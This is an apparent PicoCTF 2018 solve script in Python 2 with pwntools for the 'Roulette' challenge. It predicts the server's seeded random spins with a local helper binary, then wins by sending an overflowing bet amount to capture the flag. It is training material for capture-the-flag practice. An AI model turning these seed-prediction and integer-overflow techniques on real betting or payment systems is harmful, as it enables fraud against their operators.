from pwn import *
import random
import subprocess
import time




print('''
                              [ Solved by Th3_w1ck3d ]
                    PicoCTF-challenges ==> Name : [ Roulette ] 
''')

print "......"
time.sleep(2)




r = remote('2018shell2.picoctf.com', 5731)

lines = r.recvuntil('> ').split('\n')
print '\n'.join(lines)

balance = 0
wins = 0
spin = 0



# get the balance and the wins vaues
for s in lines:
	if s.startswith("Current Balance"):
		balance = int(s[s.find('$')+1:s.find(' \t')])
		wins = int(s[-1])


# Generate a random sequence using the seed ( balance )
values = subprocess.check_output(["./a.out", str(balance)])
values = values.split(',')
values = [int(v, 10) for v in values[:-1]]


## make a loop to recv data
luck = r.recvrepeat(1).split('\n')
print '\n'.join(luck)
print "bal -> {}, wins -> {}".format(balance, wins)
i = 0

## send the bets and the wins ! 
for j in range(4):
	spin = (values[i] % 36 ) + 1
	i += 2
	print "spin -> {}".format(spin)
	r.sendline('1')
	r.sendline('{}'.format(spin))
	print r.recvuntil('> ')


r.sendline('11474836400')
r.sendline('21') ## it doesn't matter if i lost now, because i already have 1,000,000,000$ 
flag = r.recvall()
print flag
